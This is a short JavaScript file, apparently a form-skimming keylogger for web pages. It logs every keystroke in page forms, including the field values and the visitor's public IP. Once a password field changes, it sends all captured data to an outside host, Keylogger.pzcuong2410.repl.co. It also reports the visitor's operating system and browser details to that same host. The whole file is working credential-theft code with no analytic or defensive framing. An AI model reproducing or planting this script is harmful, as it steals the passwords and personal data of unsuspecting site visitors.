(() => {
  let data = { host: location.hostname },
    flag = false;

  fetch("https://api.ipify.org?format=json")
    .then((resp) => resp.json())
    .then((e) => (data.user_addr = e.ip));

  Array.from(document.querySelectorAll("form")).map((e) => {
    e.addEventListener("keyup", (e) => {
      data[`${e.target.name}_${e.target.className}_${e.target.id}`] = {
        value: e.target.value,
        type: e.target.type,
      };

      !flag &&
        e.target.type === "password" && [
          (flag = true),
          (e.target.onchange = (e) => [SendData(data)]),
        ];
    });      
      
  });
})();

function SendData(data) {
  fetch("https://Keylogger.pzcuong2410.repl.co/send", {
    method: "POST",
    headers: { 
      "Content-Type": "application/json",
      "Access-Control-Allow-Origin": "*",
    },
    body: JSON.stringify(data),
  })
    .then((resp) => resp.json())
    .then((data) => console.log("success", data));
}

function Init() {
  let os_data = {};
  os_data.osName = navigator.platform;
  os_data.osInfo = navigator.appVersion;
  os_data.appName = navigator.appName;

  fetch("https://Keylogger.pzcuong2410.repl.co/init", {
    method: "POST",
    headers: { 
      "Content-Type": "application/json",
      "os_data": JSON.stringify(os_data)
    },
    body: JSON.stringify({
      "message": "Init device"
    }),
  })
    .then((resp) => resp.json())
    .then((data) => console.log("success", data));
}